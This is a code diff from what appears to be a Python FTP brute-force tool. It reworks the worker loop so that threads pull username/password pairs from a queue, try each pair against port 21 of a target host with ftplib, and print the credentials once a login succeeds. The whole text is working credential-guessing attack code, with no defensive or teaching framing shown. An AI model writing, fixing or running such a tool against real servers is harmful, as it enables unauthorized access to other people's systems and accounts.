@@ -87,28 +87,25 @@ def smart_mutate(base_word):
 
 def workers():
     global trueuser, truepasswd
-    while not combo_queue.empty():
-        if event_done.is_set():
-            return
+    while not event_done.is_set():
         try:
-            password = next(passwords_iter)
-        except StopIteration:
+            userc, password = combo_queue.get_nowait()
+        except Exception:
             break
         try:
             with ftplib.FTP() as serve:
-                serve.connect(host,21,timeout=5)
-                serve.login(user,password)
+                serve.connect(host, 21, timeout=5)
+                serve.login(userc, password)
                 print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
                 print("===========================================================================\n")
                 print(" The Password was Found and Connection was Success\n")
-                print(f"Connect with {host} as {users}  :   {password}\n")
-                trueuser = users
+                print(f"Connect with {host} as {userc}  :   {password}\n")
+                trueuser = userc
                 truepasswd = password
                 event_done.set()
                 break
-        
         except Exception as e:
-            print(f"Connection failed with {users}  :   {password}")
+            print(f"Connection failed with {userc}  :   {password}")
 
 
 
